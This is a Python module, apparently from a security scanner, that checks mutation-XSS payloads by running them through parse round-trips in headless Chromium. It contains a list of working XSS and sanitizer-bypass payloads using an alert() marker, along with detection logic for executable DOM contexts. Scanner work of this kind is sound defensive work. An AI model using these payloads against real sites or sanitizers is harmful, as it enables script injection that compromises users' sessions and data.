"""Real-browser mXSS mutation-matrix verification (Phase 91 / P2).

The static layer (`mutation.analyze`) infers exploitability: "payload
reflected AND the page contains a mutating sink (innerHTML/DOMParser/...)".
That is heuristic -- it cannot tell whether a browser's HTML parser would
actually MUTATE the reflected markup into executable form.  Sanitizer
bypasses (DOMPurify and friends) are decided by real parse-serialize-reparse
behaviour, not by keyword scanning.

This module closes the gap by running the payload through a REAL headless
Chromium parse round-trip:

    1. ``div.innerHTML = payload``   -- first parse, mimicking sanitizer
       output / reflected HTML landing in a sink.
    2. read back the serialised tree (innerHTML/outerHTML of the container).
    3. feed the serialisation back through ``innerHTML`` again -- second
       parse, mimicking the mutated HTML being re-inserted elsewhere.
    4. judge whether the marker escaped into an executable context: an
       ``on*`` event-handler attribute, a live ``<script>`` element, or a
       bare tag at container top level (i.e. the sanitizer boundary was
       crossed by the mutation).

A payload whose marker survives into an executable context after the
round-trip is a CONFIRMED mutation vector: the same bytes served through an
``innerHTML``-style sink execute.  ``verify_mutation()`` is deliberately a
pure function of the payload string (no URL needed) so the scan layers and
tests can call it anywhere; it degrades to ``{"available": False}`` when
Playwright is missing or the thread already runs an event loop.

Classic corpus lives in ``mutation.MXSS_PAYLOADS``; the vector set below adds
the post-2020 parser-mutation families (math/mtext, form/math, svg/animate,
noscript title-breakout, template shadowroot, ...) that sanitizer bypasses
have relied on.
"""
from __future__ import annotations

import re

# ---------------------------------------------------------------------------
# Modern mutation vector corpus.  Each payload embeds MARK (the alert token);
# the module rewrites it to a per-call unique marker so cross-run evidence
# stays attributable.
# ---------------------------------------------------------------------------

MARK = "__MXSS__"

# (payload, human vector description)
MXSS_VECTORS: list[tuple[str, str]] = [
    # Classic svg+style foreign-content: <style> is raw text in HTML, but the
    # serialised <img> escapes foreign content and fires on re-parse.
    (f"<svg><style><img src=x onerror=alert('{MARK}')></style>",
     "svg+style foreign-content re-serialisation"),
    (f"<math><style><img src=x onerror=alert('{MARK}')></style>",
     "math+style foreign-content re-serialisation"),
    # noscript: parsed as raw text while scripting enabled, normal HTML after
    # the round-trip lands in a scripting context.
    (f"<noscript><img src=x onerror=alert('{MARK}')></noscript>",
     "noscript raw-text mutation"),
    # svg desc/title raw-text -> foreign-content.
    (f"<svg><desc><img src=x onerror=alert('{MARK}')></desc></svg>",
     "svg desc foreign-content mutation"),
    # math mtext: DOMPurify-era bypass family -- <math><mtext> swallows the
    # following markup until </mtext>, re-serialised children escape.
    (f"<math><mtext><img src=x onerror=alert('{MARK}')></mtext></math>",
     "math/mtext text-integration-point mutation"),
    # form reparenting: <form> inside foreign content is hoisted out, taking
    # nested handlers across the sanitizer boundary.
    (f"<svg><foreignObject><form><img src=x onerror=alert('{MARK}')>"
     "</form></foreignObject></svg>",
     "svg foreignObject form reparenting"),
    (f"<form><math><mtext></form><form><mglyph><style>"
     f"</math><img src=x onerror=alert('{MARK}')>",
     "form/math nested-escape mutation"),
    # svg animate: <animate> attributeName=href on <a> can switch an anchor
    # to javascript: after sanitizer inspection.
    (f"<svg><a><animate attributeName=href values=javascript:alert('{MARK}')"
     " /></a></svg>",
     "svg animate href attribute mutation"),
    # noscript title breakout: attribute value closes the raw-text element,
    # the inner img surfaces on re-parse.
    (f'<noscript><p title="</noscript>'
     f'<img src=x onerror=alert(\'{MARK}\')>">',
     "noscript title attribute breakout"),
    # template shadowrootmode: declarative shadow DOM lets a sanitizer see an
    # inert <template> while the browser adopts executable children.
    (f"<template shadowrootmode=open><img src=x onerror=alert('{MARK}')>"
     "</template>",
     "declarative shadow DOM template adoption"),
    # style/script comment confusion -- serialiser normalises the CSS
    # comment so the re-parse sees an open script.
    (f"<svg><style><!--</style><img src=x onerror=alert('{MARK}')>-->",
     "svg style comment-closing mutation"),
    # backslash attribute separator confusion.
    (f"<img src=x\\ onerror=alert('{MARK}')>",
     "backslash attribute-separator mutation"),
    # <iframe srcdoc> does not execute until adopted/parsed by the parent.
    (f"<iframe srcdoc=\"<img src=x onerror=alert('{MARK}')\">",
     "iframe srcdoc delayed execution"),
]


def _payloads() -> list[str]:
    """Public: the modern vector payload list (marker placeholder)."""
    return [p for p, _ in MXSS_VECTORS]


# ---------------------------------------------------------------------------
# Serialisation / mutation / escape checks (pure helpers, unit-testable).
# ---------------------------------------------------------------------------

_SERIALIZED_READBACK_JS = """
(arg) => {
  const payload = arg.payload;
  const bodyMark = arg.mark;
  // First parse: the sanitizer/reflection landing.
  const c = document.createElement('div');
  c.innerHTML = payload;
  const serialized = c.innerHTML;
  // Second parse: the serialisation re-lands (mXSS core round-trip).
  const c2 = document.createElement('div');
  c2.innerHTML = serialized;
  // DOM-level executable-node scan (string regexes miss attribute
  // normalisation and namespace reparenting).
  const execNodes = [];
  const all = c2.querySelectorAll('*');
  for (const el of all) {
    for (const attr of el.attributes) {
      if (/^on/i.test(attr.name) && attr.value.includes(bodyMark)) {
        execNodes.push(el.tagName.toLowerCase() + '[' + attr.name.toLowerCase()
          + '="' + attr.value.slice(0, 60) + '"]');
      } else if (/^(href|src|xlink:href|action|formaction)$/i.test(attr.name)
          && /^\s*javascript:/i.test(attr.value)
          && attr.value.includes(bodyMark)) {
        execNodes.push(el.tagName.toLowerCase() + '[' + attr.name.toLowerCase()
          + '=javascript:...]');
      }
    }
  }
  for (const s of c2.querySelectorAll('script')) {
    if (s.textContent.includes(bodyMark)) execNodes.push('script');
  }
  c.remove();
  return {serialized, execNodes};
}
"""


def marker_in_exec_context(html: str, marker: str) -> bool:
    """String-level heuristic used by the static fallback path.

    (The real browser path uses the DOM-level scan in _SERIALIZED_READBACK_JS;
    this pure helper remains for callers without Playwright.)
    """
    if not html or not marker:
        return False
    esc = re.escape(marker)
    # 1. inside a real (unescaped) <script> block
    for m in re.finditer(r"<script\b[^>]*>(.*?)</script>",
                         html, re.IGNORECASE | re.DOTALL):
        if re.search(esc, m.group(1)):
            return True
    # 2. on*="..." handler attribute that actually CONTAINS the marker
    for m in re.finditer(
            r"\bon\w+\s*=\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s>]+))",
            html, re.IGNORECASE):
        val = m.group(1) or m.group(2) or m.group(3) or ""
        if marker in val:
            return True
    # 3. javascript: URI carrying the marker (href/src/xlink:href/formaction
    #    and bare javascript: occurrences with an attribute boundary).
    if re.search(r"(?:href|src|xlink:href|formaction|action)\s*=\s*"
                 r"[\"']?\s*javascript:[^\"'>]*" + esc, html, re.I):
        return True
    return False


def _executable_readback_js(payload: str, marker: str) -> str:
    """Build the page-evaluate snippet for one payload (marker-aware)."""
    # marker travels as a runtime argument (payload arg is the chunk being
    # parsed this round); bodyMark is the token we hunt in exec contexts.
    return _SERIALIZED_READBACK_JS


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def verify_mutation(payload: str, marker: str | None = None,
                    rounds: int = 2, timeout: int = 15) -> dict:
    """Run one payload through real-browser parse round-trips.

    Args:
        payload: HTML string to test (marker placeholder ``__MXSS__`` or a
            literal marker is accepted).
        marker: alert token to hunt for in executable contexts.  Defaults to
            the payload's own ``__MXSS__`` literal or the classic
            ``alert(1)``-style scan of the payload.
        rounds: how many parse-serialise cycles to run (default 2 -- the
            first parse is the sanitizer/reflection landing, the second is
            the re-insertion of mutated HTML).

    Returns:
        dict:
          available   bool   -- playwright usable in this thread?
          marker      str    -- effective marker hunted
          mutated     bool   -- serialisation changed across a round-trip
          dangerous   bool   -- marker reached an executable context
          roundtrips  list[str] -- serialised HTML after each round
          vector      str    -- first vector description whose payload is
                                structurally similar (informational)
          detail      str    -- human summary when dangerous
    """
    if marker is None:
        marker = MARK
    eff_payload = payload.replace(MARK, marker)
    out = {
        "available": False, "marker": marker, "mutated": False,
        "dangerous": False, "roundtrips": [], "vector": "",
    }
    try:
        from .dom_engine import get_shared_browser, _loop_running
        if _loop_running():
            out["detail"] = ("thread already runs an event loop; "
                             "playwright sync API refused")
            return out
        browser = get_shared_browser()
    except Exception as e:
        out["detail"] = f"playwright unavailable: {e}"
        return out
    page = None
    try:
        page = browser.new_page()
        # chained round-trips: serialisation of round N becomes the payload
        # of round N+1, mimicking mutated HTML re-landing in a sink
        prev = eff_payload
        for _ in range(max(1, rounds)):
            try:
                res = page.evaluate(_SERIALIZED_READBACK_JS,
                                    {"payload": prev, "mark": marker})
            except Exception as e:
                out["detail"] = f"evaluate error: {e}"
                return out
            serialized = res.get("serialized") or ""
            out["roundtrips"].append(serialized)
            exec_nodes = res.get("execNodes") or []
            if exec_nodes:
                out["dangerous"] = True
                out["exec_nodes"] = exec_nodes
                out["detail"] = ("marker reached an executable DOM node "
                                 f"({'; '.join(exec_nodes[:3])}) after the "
                                 "browser parse-serialise round-trip")
            prev = serialized
        # mutated: any round's serialisation differs from the input payload
        out["mutated"] = any(
            rt and rt != eff_payload for rt in out["roundtrips"])
        if out["dangerous"]:
            out["detail"] = ("marker reached an executable context after "
                             "the browser parse-serialise round-trip")
    except Exception as e:
        out["detail"] = f"mxss verification error: {e}"
        return out
    finally:
        if page is not None:
            try:
                page.close()
            except Exception:
                pass
    return out


def verify_vector_set() -> list[dict]:
    """Verify every vector in the modern corpus; return per-vector results.

    Convenience for CLI/regression: yields the same dict as verify_mutation
    with ``vector`` filled from the corpus description.
    """
    results = []
    for payload, vec in MXSS_VECTORS:
        r = verify_mutation(payload)
        r["vector"] = vec
        results.append(r)
    return results
